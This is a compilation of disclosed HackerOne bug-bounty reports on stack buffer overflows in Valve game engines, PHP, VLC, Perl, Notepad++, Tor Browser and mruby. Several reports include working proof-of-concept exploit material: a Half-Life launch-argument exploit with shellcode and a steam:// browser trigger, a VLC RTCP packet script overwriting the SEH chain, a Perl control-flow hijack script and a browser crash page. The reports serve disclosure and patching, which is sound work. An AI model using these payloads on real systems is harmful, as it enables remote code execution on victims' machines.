- **Program:** Valve
- **Reporter:** @nyancat0131
- **Bounty:** 2500 usd
- **Disclosed:** 2021-05-06T16:17:45.462Z
- **CVE(s):** -

**Summary (team):**

Title:         [CS:GO] Unchecked texture file name with TEXTUREFLAGS_DEPTHRENDERTARGET can lead to Remote Code Execution
Scope:         csgo.exe
Weakness:      Stack Overflow
Severity:      High (8.0)
Link:          https://hackerone.com/reports/550625
Date:          2019-04-29 17:52:46 +0000
By:            @nyancat0131

Details:
## Summary

A texture with long file name and has `TEXTUREFLAGS_DEPTHRENDERTARGET` set can trigger a Stack Buffer Overflow, which leads to Arbitrary Code Execution due to return pointer (EIP) being overwritten.

## Affects

Tested: CS:GO
Potentially affected: All Valve's Source Engine games

## Steps to reproduce

- Download F478261, extract it to `<csgo_install_dir>/csgo` folder
- Start CS:GO, attach WinDBG or any other debugger
- Host a new game on map `aim_pwn`
- Observe the crash with the attached debugger. The EIP will be overwritten to `0x61616161`

NOTE: The path to CS:GO installation directory must not be too long, so that the accompanied texture file can be extracted successfully.

## Attack scenario

This vulnerability can be exploited remotely because anyone can host a CS:GO server with custom maps. When the victim connects to a malicious server, the custom map will be downloaded along with its resources.

## Impact

Attackers can execute arbitrary code on victim's computer. They can compromise victim's important data, accounts, ... and many things more.

---

### [GoldSrc: Buffer Overflow in DELTA_ParseDelta function leads to RCE](https://hackerone.com/reports/484745)

- **Report ID:** `484745`
- **Severity:** Critical
- **Weakness:** Stack Overflow
- **Program:** Valve
- **Reporter:** @pixelindigo
- **Bounty:** 3000 usd
- **Disclosed:** 2021-05-04T19:29:19.947Z
- **CVE(s):** -

**Summary (team):**

## Description
The bug is triggered by 2 packets.
First one is `svc_deltadescription` which describes memory layout of such structures as `event_t`, `weapon_data_t`, ...
It is sent as a list of fields' descriptions: type, offset and others.
Next, `DELTA_ParseDelta` fills these structures when corresponding delta packets are received. The problem is that this function doesn't check if `field_offset + field_size` doesn't exceed bounds of allocated memory for these structures which can lead to buffer overflow.

To actually trigger this overflow we need to send specially crafted delta information. I found that `svc_event` packet is parsed in `ParseEvent` function that allocates `event_t` structure on the stack and then fills it in vulnerable `DELTA_ParseDelta` function.

Using this info we can craft two packets that will triger stack overflow.
In my exploit I used following memory layout for `event_t` structure:
```
payload:
  - type=String
  - offset=0xac  # offset of return address in ParseEvent function
int1:
  - type=Integer
  - offset=0xac + <int1 offset in payload>
...
intn:
  - type=Integer
  - offset=0xac + <intn offset in payload>
```
The first field is used for the payload. Other extra integer fields are used to put data in the payload that has 2 or more zeros (for example 0x0b for syscall) since `DELTA_ParseDelta` copies string until it meets the null character `\0`.

NX is enabled, so it is not possible to execute shellcode on the stack or any other writable memory region directly. However, the main executable `hl` is loaded at the fixed address, which means we can build some ROPs without leaking addresses.
I decided to take it one step further and build a rop chain to pop calc, so I checked other libraries and found `int 0x80` gadget in `hw.so`. Though, it will be loaded on different addresses on each run, which means that a rop chain has to calculate the base address of `hw.so` at runtime.

I came up with the following rop chain (you can check the full one in the attached extra materials):
1. Call `strncpy` to build `/usr/bin/xcalc` and `DISPLAY=:0` strings in .bss section from bytes that scattered across readonly sections
2. Call `Sys_LoadModule("hw.so")` to get its base address
3. Prepare execve syscall arguments and jmp to int 0x80

## Steps to reproduce
This poc exploit pops  `xcalc`. In my demo I used clean ubuntu 18.10, but it should work in other environments that have `/usr/bin/xcalc`.
1. Make sure that you have python3 installed to run server
2. Start server with `python3 poc.py` F411266  
3. Launch Counter-Strike 1.6  
4. Connect to 127.0.0.1  

After these steps xcalc should pop up.


## PoC Demo
{F411267}

## Impact

Remote Code Execution on client.

---

### [[GoldSrc] Remote Code Execution using malicious WAD list in BSP file](https://hackerone.com/reports/675710)

- **Report ID:** `675710`
- **Severity:** Critical
- **Weakness:** Stack Overflow
- **Program:** Valve
- **Reporter:** @nyancat0131
- **Bounty:** 750 usd
- **Disclosed:** 2021-05-04T19:26:46.518Z
- **CVE(s):** -

**Summary (team):**

## Summary

`TEX_InitFromWad` function calls `COM_FileBase` to get file name from a path into a buffer on the stack. Since `COM_FileBase` does not have boundary checks and the buffer is small, long WAD file name can trigger a Stack Buffer Overflow, leading to arbitrary code execution.

## Steps to reproduce

Environment: Windows 10 x64 18362

- Install Counter-Strike Dedicated Server. Let's call the directory where it's installed `SERVER_DIR`
- Install AMX Mod X for the dedicated server
- Compile F558348, install and enable it in AMX Mod X `plugins.ini`
- Copy any `.exe` file to `SERVER_DIR/cstrike/pwn.ed` (`pwn.ed` is the file name)
- Extract F558346 to `SERVER_DIR/cstrike/maps/`
- Start Counter-Strike Dedicated Server on map `cs_pwn`
- After the map is fully loaded, extract F558347 to `SERVER_DIR/cstrike/maps/`
- Install Counter-Strike Client
- Start Counter-Strike Client
- Connect to the dedicated server

Expected behavior: `pwn.ed` will be downloaded and executed.

## Impact

Attackers can remotely execute arbitrary code on victim's computer. The lack of ASLR on `hl.exe` makes the exploit 100% reliable.

---

### [mb_strtolower (UTF-32LE): stack-buffer-overflow at php_unicode_tolower_full (CVE-2020-7065)](https://hackerone.com/reports/838127)

- **Report ID:** `838127`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @anatoliq
- **Bounty:** - usd
- **Disclosed:** 2020-10-21T07:56:56.251Z
- **CVE(s):** CVE-2020-7065

**Vulnerability Information:**

PHP bug report (made public by the maintainers at the time of writing): https://bugs.php.net/bug.php?id=79371
Mitre CVE page: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7065
Link to the release notes: https://www.php.net/ChangeLog-7.php#7.4.4

## Impact

One of impacts is that the issue allows an attacker to straightforwardly crash the PHP interpreter provided a specific UTF character can be passed to `mb_strtolower` function dealing with UTF-32LE encoding. 

Original summary from the bug report:
> A call to `mb_strtolower` allows overwriting of a stack-allocated buffer with an overflown array from .rodata.

Description as provided by CVE database entry:
> In PHP versions 7.3.x below 7.3.16 and 7.4.x below 7.4.34, while using mb_strtolower() function with UTF-32LE encoding, certain invalid strings could cause PHP to overwrite stack-allocated buffer. This could lead to memory corruption, crashes and potentially code execution.

---

### [Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser](https://hackerone.com/reports/832750)

- **Report ID:** `832750`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Valve
- **Reporter:** @irukandjisecresearch
- **Bounty:** - usd
- **Disclosed:** 2020-08-19T03:20:04.881Z
- **CVE(s):** -

**Summary (team):**

Half Life 1 allows users to set various launch arguments when running the game from the command line, one of them is "**-game**" which specifies the game/mod to be launched. [Documented here](https://developer.valvesoftware.com/wiki/Command_Line_Options#Command-line_parameters_2)

```
hl.exe -game <argument>
```

The contents of this argument is copied via a call to strcpy() onto the stack without any size checking, this results in adjacent memory being overwritten including the stored return address.

This can be tested by parsing an overly long argument to **hl.exe -game <argument>** and easily viewed in **Immunity Debugger** by opening hl.exe and setting the arguments field to -game <overly long input> as seen below.
{F762911}

I believe this routine in WinMain() is the root cause, specifically the strcpy() call.
{F762804}


**An attacker can demonstrably use this to hijack program control flow and execute arbitrary code on the target system, as you can see here EIP is controlled.**
{F762809}

**Control flow being hijacked after return address is overwritten and function returns**
{F762846}
**Beginning of shellcode execution**
{F762842}
This memory corruption can be triggered through Steam's URI handler which allows a browser to launch steam games and specify arguments.

```python
payload = "A"*524
payload += "B"*4

print payload

'''
Either run from command line/in debugger using hl.exe -game <payload> or use the payload in the browser POC below
'''

```

The exploit below is not quite working because the shellcode won't execute in it's entirety, however the first few instructions get executed demonstrating arbitrary code execution. 

```python
import struct

#msfvenom -p windows/exec CMD=calc.exe BufferRegister=ESP --platform windows -a x86 -e x86/alpha_upper
shellcode = "TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMRUPC0C03PLIM56Q9PBDLK606PLK0R4LLK0R24LKT2VH4ONW1Z7V6QKONLWL513L32VLQ09QXO4MEQ8GJBJRF2PWLK62TPLK1ZWLLKPL4Q48JC0H318Q0QLK0Y7PC1ICLK0ITXZCGJW9LK04LKUQN6FQKONLIQ8ODM319W08M0D5ZV5SSMKHWKSMFDRUZD68LKF814UQYC2FLKTLPKLKQHELS1YCLKC4LK318PMYW4Q47TQK1K51PYQJPQKOKP1O1OPZLK4RJKLM1MCZC1LMK5OBEP5P5PPPBHVQLKROK7KO8UOKZPOE920VSXY6MEOMMMKOYE7LS63LTJK0KKKP3E35OKG75C42ROCZS01CKOYE3SCQBLRC6NRE482E5PAA"

payload = "A"*524
payload += struct.pack("<L",0x757d6537) #JMP ESP will differ 
payload += shellcode

print payload

```
Browser POC:
```
steam://rungameid/70//-game <payload output> 
```

Due to Half Life's command line argument parsing, the entire payload has to comprise of ASCII printable characters, as a result I could not use a JMP ESP gadget from the binary or any loaded process specific DLLs, instead I had to use a gadget address in an OS module which was protected by ASLR. 

However, being a 32bit process means the ASLR entropy on this gadget is relatively low and a successful attack could be executed on AT WORST 1/256 victims.

Older versions of Windows that don't employ ASLR on various OS .dlls would theoretically guarantee a near 100% successful exploitation rate. 

**Test Machine**
```
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18362 N/A Build 18362
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 1 AuthenticAMD ~3000 Mhz

Hotfix(s):                 12 Hotfix(s) Installed.
                           [01]: KB4537572
                           [02]: KB4515383
                           [03]: KB4516115
                           [04]: KB4521863
                           [05]: KB4524244
                           [06]: KB4524569
                           [07]: KB4528759
                           [08]: KB4537759
                           [09]: KB4538674
                           [10]: KB4541338
                           [11]: KB4501374
                           [12]: KB4551762

```

## Impact

An attacker could use this vulnerability to gain remote code execution on the host machine of a victim who clicked on a malicious link as long as they have Steam and Half Life installed.

According to SteamSpy this could affect as many as ten million users.
[Link to Half Life Stats](https://steamspy.com/app/70)

---

### [VLC 4.0.0 - Stack Buffer Overflow (SEH)](https://hackerone.com/reports/489102)

- **Report ID:** `489102`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** VLC (European Commission - DIGIT)
- **Reporter:** @qrayn
- **Bounty:** 2817 usd
- **Disclosed:** 2020-02-10T20:54:07.452Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Incorrect calculation of Buffer Size in rist module for VLC leading to Stack Overflow with SEH chain overwrite.

The modules/access/rist module has an incorrect calculation of buffer size giving an attacker the possibility to set the buffer size of a local variable by sending a maliciously crafted RTSP packet and overflowing the variable in a proceeding memcpy operation. 

**Description:**

In the static void rtcp_input(...) function a variable new_sender_name is defined with a maximum size of MAX_CNAME (128 bytes). When reading a RTCP_PT_SDES package the length for the memcpy operation is set by the rtcp_sdes_get_name_length(buf) which is taking the 9-10th bit of the buffer and making it possible to change the amount of bytes read into the new_sender_name variable.

_rtcp_input(...) (modules/access/rist.c)_
```
/** Sender name is set to max length of MAX_CNAME (128), line: 446 **/
char new_sender_name[MAX_CNAME];

/** name_length is read from the RTSP header, line: 489 **/
int8_t name_length = rtcp_sdes_get_name_length(buf);

/** memcpy new_sender_name with name_length bytes, line: 525 **/
memcpy(new_sender_name, buf + RTCP_SDES_SIZE, name_length);
```

For this to be exploitable the user has to first actively setup a rist listener using VLC.

## Steps To Reproduce:

  1. Open VLC and bind rist on local port: vlc.exe rist://0.0.0.0:8888
  2. Edit IP and port configuration in vlc.py
  3. Execute PoC: ./vlc.py

## Supporting Material/References:

### Proof of Concept

```
#!/usr/bin/python
import socket

server = ("192.168.0.23", 8889)
udp = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

bufsize = "\x80" # Amounts of bytes we want read into new_sender_name (128 bytes)

buf = "\x80"                  # Version and padding
buf += "\xCA"                 # packet type = RTCP_PT_SDES
buf += "\x00\x00"             # Record length
buf += "\x00\x00\x00\x00\x00" # SDES record
buf += bufsize                # Buffer size of name 9-10 bit

# 64 bit
buf += "A" * 232 + "B" * 8 + "C" * 8 + "D" * 200 # Buffer for new_sender_name

# 32 bit
#buf += "A" * 568 + "B" * 4 + "C" * 4 + "D" * 50 # Buffer for new_sender_name

udp.sendto(buf, server)
```

### SEH chain overwrite

0:019> !exchain
100 stack frames, scanning for handlers...
Frame 0x01: error getting module for 4242424242424242
Frame 0x02: error getting module for 4343434343434343
Frame 0x03: error getting module for 4444444444444444

0:019> !exchain
3411ff68: 43434343
Invalid exception stack at 42424242

## Suggested mitigation

Extended bounds checking on line 490 would mitigate this problem.

Replacing the following code on line 490:
```
if (name_length > bytes_left)
```

With an extended bounds check:
```
if (name_length > bytes_left || name_length >= MAX_CNAME)
```

## Impact

## Impact
High implication buffer overflow causing application crash and SEH record overwrite. Explotation plausible depending on system and security setup.

Successful exploitation could lead to remote code execution and full system compromise.

If the user is using rist this vulnerability would be able to execute remotely.

## Affected versions
The code seems to have been introduced in a commit on 5th of November 2018 to the 4.0.0-dev branch. Earlier versions seems unaffected by this vulnerability.

---

### [Perl $ENV Key Stack Buffer Overflow](https://hackerone.com/reports/272497)

- **Report ID:** `272497`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @johnleitch
- **Bounty:** 1500 usd
- **Disclosed:** 2019-11-12T09:39:58.965Z
- **CVE(s):** CVE-2017-12814

**Vulnerability Information:**

The CPerlHost::Add method in win32\perlhost.h is vulnerable to a stack buffer overflow.

void
CPerlHost::Add(LPCSTR lpStr)
{
    char szBuffer[1024];
    LPSTR *lpPtr;
    int index, length = strlen(lpStr)+1;

    for(index = 0; lpStr[index] != '\0' && lpStr[index] != '='; ++index)
    szBuffer[index] = lpStr[index];

    szBuffer[index] = '\0';
    [...]
}

The issue exists because the size of lpStr, the key passed in when indexing into $ENV, is not checked before it is copied into szBuffer, a fixed size stack buffer.

The issue can be reproduced on a win32 build with the following script.

print "Starting\r\n";
$ENV{"A" x (0x1000)} = 0;
print "Done\r\n";

In cases where the $ENV key is exposed as attack surface (such as through CGI-BIN custom HTTP headers), it may be possible for an attacker to achieve arbitrary code execution. The issue was exploited in both Strawberry and Active State Perl, which appear to be compiled without stack canaries or ASLR.

print "Starting\r\n";

$chars =
    "\x41\x41\x41\x41" .
    "\x78\x6e\x3b\x6e" .    # perl526!exit (6E3B6E78)
    "\x43\x43\x43\x43" .
    "\x4e\x1d\x1e\x03" .    # exit code (52305230)
    "\x45\x45\x45\x45" . 
    "\x46\x46\x46\x46" . 
    "\x47\x47\x47\x47" . 
    "\x30\x2c\x3a\x6e";     # perl526!win32_getpid (6e3a2c30)

$ENV{$chars x ((0x400+0x4*0x10) / length $chars)} = 0;

print "Done\r\n";

A proposed patch that validates the length of lpStr follows.

diff --git "a/d:\\source2\\perl-raw\\win32\\perlhost.h" "b/D:\\source2\\perl\\win32\\perlhost.h"
index 84b08c9..665504e 100644
--- "a/d:\\source2\\perl-raw\\win32\\perlhost.h"
+++ "b/D:\\source2\\perl\\win32\\perlhost.h"
@@ -2177,12 +2177,15 @@ compare(const void *arg1, const void *arg2)
 void
 CPerlHost::Add(LPCSTR lpStr)
 {
-    char szBuffer[1024];
+    char szBuffer[2048];
     LPSTR *lpPtr;
     int index, length = strlen(lpStr)+1;
 
     for(index = 0; lpStr[index] != '\0' && lpStr[index] != '='; ++index)
-	szBuffer[index] = lpStr[index];
+        if (index != sizeof(szBuffer) - 1)
+            szBuffer[index] = lpStr[index];
+        else
+            Perl_croak_nocontext("$ENV key too large");
 
     szBuffer[index] = '\0';
 
Note that the buffer size had to be increased to accommodate larger values that were previously causing silent overwrites.

Credit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com)

---

### [Malformed playlist.txt in GoldSrc games leads to Access Violation & arbitrary code execution](https://hackerone.com/reports/504951)

- **Report ID:** `504951`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Valve
- **Reporter:** @nyancat0131
- **Bounty:** 1000 usd
- **Disclosed:** 2019-09-17T17:34:09.603Z
- **CVE(s):** -

**Vulnerability Information:**

A crafted `playlist.txt` can be used to exploit a stack overflow vulnerability in `GameUI.dll` that can lead to arbitrary code execution.

# Reproduction
Place attached `playlist.txt` in game directory (`valve`, `cstrike`, etc.). The game will crash when it tries to play `Splash` track.

# Exploitability
The file can be sent from server with `precache_generic` function (custom `mp.dll`, amxx plugins, etc.). I don't know ant way to force reload the playlist, so for the exploit to trigger, the client must be restarted. In my opinion, it's still dangerous. And this method won't work if the client already had `playlist.txt` in the game directory.

## Impact

The attacker can use this to do many things, from crashing the client to stealing important data.

---

### [Stack overflow in XML Parsing](https://hackerone.com/reports/480883)

- **Report ID:** `480883`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Notepad++
- **Reporter:** @ammm
- **Bounty:** - usd
- **Disclosed:** 2019-08-25T12:50:13.333Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 

A stack buffer overflow vulnerability has been detected in XML parsing functionality  on Notepad++.

That's due to the fact that _invisibleEditView.getText function doesn't check buffer boundaries.

**Description:** 
Vulnerability src file: notepad-plus-plus/PowerEditor/src/Notepad_plus.cpp
Vulnerability line: line 1008
Variable affected: char encodingStr[128];
Function that overflows buffer: _invisibleEditView.getText

## Steps To Reproduce:

  1. Create a .xml file with a correct XML format
  2. Introduce a big XML field that overflows "encodingStr" buffer.
  3. Open the file with Notepad++ and application should crash.

## Supporting Material/References:

  * BoF_example1.xml -> Exploit example

## Impact

An attacker could create a malicious .xml file that triggers a stack buffer overflow on victim machine.

You only need to open attached .xml file example with Notepad++ to reproduce the exploit.

---

### [Stack overflow in UnbindFromTree (browser can be crashed remotely)](https://hackerone.com/reports/264481)

- **Report ID:** `264481`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** Tor
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2017-10-02T07:40:29.690Z
- **CVE(s):** -

**Vulnerability Information:**

I reported this bug to Mozilla approximately [9 months ago](https://bugzilla.mozilla.org/show_bug.cgi?id=1322307) and all versions of Firefox back to at least ESR45 and including current Nightly 57 builds are still vulnerable to this unpatched flaw. I've tested on Fedora 26, Debian 8, Windows 8 and Windows 10. Mozilla declined to award a bounty. 

Code:
```
<html>
<head></head>
<body>
<script>
function done() {
}

var x = '';
for (i=0; i<500000; ++i)
  x += '<a>';
var uri = 'data:image/svg+xml,' + x;
var i = new Image();
i.src = uri;
</script>
</body>
</html>
```

The caveat to this is that if scripts are disabled on the page where this code is located, the Tor browser won't crash. [This link](https://bugzilla.mozilla.org/attachment.cgi?id=8817075) will probably crash your Firefox. A WinDBG stack trace is located [here](https://bugzilla.mozilla.org/attachment.cgi?id=8817117).

---

### [mirb only: stack-buffer-overflow (OOB write) in main()](https://hackerone.com/reports/219870)

- **Report ID:** `219870`
- **Severity:** High
- **Weakness:** Stack Overflow
- **Program:** shopify-scripts
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2017-05-09T12:43:12.853Z
- **CVE(s):** -

**Vulnerability Information:**

Triggered in `7e28510` (7 April 2017) with `mirb` only.

`cat test013.rb | mirb`

```
==17976==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffeb477fb0 at pc 0x408c21 bp 0x7fffeb477a90 sp 0x7fffeb477a88
WRITE of size 1 at 0x7fffeb477fb0 thread T0
    #0 0x408c20 in main /root/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:466
    #1 0x7f96e4703b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
    #2 0x40aefc (/root/mruby/bin/mirb+0x40aefc)

Address 0x7fffeb477fb0 is located in stack of thread T0 at offset 1184 in frame
    #0 0x40549f in main /root/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:361

  This frame has 4 object(s):
    [32, 56) 'args'
    [96, 126) 'unexpected_end'
    [160, 1184) 'last_code_line' <== Memory access at offset 1184 overflows this variable
    [1216, 5312) 'ruby_code'
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /root/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:466 main
```

---
